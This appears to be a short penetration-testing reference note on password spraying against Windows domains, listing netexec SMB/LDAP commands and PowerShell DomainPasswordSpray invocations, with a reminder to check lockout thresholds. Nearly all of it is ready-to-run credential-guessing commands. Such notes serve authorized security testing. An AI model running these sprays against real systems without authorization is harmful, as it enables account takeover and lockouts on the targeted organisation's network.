# Password Spraying
NOTE: Always check or confirm lockout threshold before spraying
## netexec
[nxc Password Spraying documentation](https://www.netexec.wiki/smb-protocol/password-spraying)
NOTE: By default nxc will exit after a successful login is found. Using the --continue-on-success flag, it will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list. This is incompatible with command execution.
1. Test a single password value with a list of user names
SMB Example:
```
nxc smb 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
Multiple usernames (space delimeter):
```
nxc smb 192.168.1.101 -u user1 user2 user3 -p Summer18 --continue-on-success
```
Multiple passwords (space delimeter):
```
nxc smb 192.168.1.101 -u user1 -p password1 password2 password3 --continue-on-success
```
LDAP Example:
```
nxc ldap 10.0.2.15 -u users.txt -p Password1 --continue-on-success
```
Input files:
```
nxc smb 192.168.1.101 -u /path/to/users.txt -p Summer18
```
```
nxc smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt
```
```
nxc smb 192.168.1.101 -u user.txt -p password.txt
```
## DomainPasswordSpray
- [DomainPasswordSpray Project](https://github.com/dafthack/DomainPasswordSpray)
- PowerShell tool
```
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Spring2017
```
The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2025.
```
Invoke-DomainPasswordSpray -UserList .\users.txt -Password Winter2025 -Verbose
```

